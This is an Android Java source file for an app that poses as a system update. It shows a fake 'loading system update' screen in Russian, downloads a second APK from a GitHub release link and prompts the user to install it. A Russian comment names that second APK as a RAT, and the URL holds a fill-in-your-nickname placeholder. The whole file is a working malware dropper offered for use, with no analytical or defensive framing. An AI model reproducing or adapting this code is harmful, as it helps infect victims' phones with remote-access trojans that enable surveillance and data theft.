package com.system.update;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;
import android.widget.ProgressBar;
import android.widget.LinearLayout;
import android.graphics.Color;
import android.view.Gravity;
import android.content.Intent;
import android.net.Uri;
import android.os.AsyncTask;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import android.os.Environment;

public class MainActivity extends Activity {
    // СЮДА ССЫЛКУ НА ВТОРОЙ APK (РАТ)
    private static final String PAYLOAD_URL = "https://github.com/ТВОЙ_НИК/whatsapp_app/releases/download/v1/payload.apk"; 

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.parseColor("#121212"));

        TextView tv = new TextView(this);
        tv.setText("Загрузка обновления\nсистемы...");
        tv.setTextSize(22);
        tv.setTextColor(Color.WHITE);
        tv.setGravity(Gravity.CENTER);

        layout.addView(tv);
        setContentView(layout);

        // Начинаем скачивание
        new DownloadTask().execute(PAYLOAD_URL);
    }

    private class DownloadTask extends AsyncTask<String, Void, File> {
        @Override
        protected File doInBackground(String... urls) {
            try {
                URL url = new URL(urls[0]);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.connect();
                InputStream input = conn.getInputStream();
                
                File file = new File(getExternalFilesDir(null), "update.apk");
                FileOutputStream output = new FileOutputStream(file);
                byte[] data = new byte[1024];
                int count;
                while ((count = input.read(data)) != -1) {
                    output.write(data, 0, count);
                }
                output.flush();
                output.close();
                input.close();
                return file;
            } catch (Exception e) {
                e.printStackTrace();
                return null;
            }
        }

        @Override
        protected void onPostExecute(File file) {
            if (file != null) {
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        }
    }
}
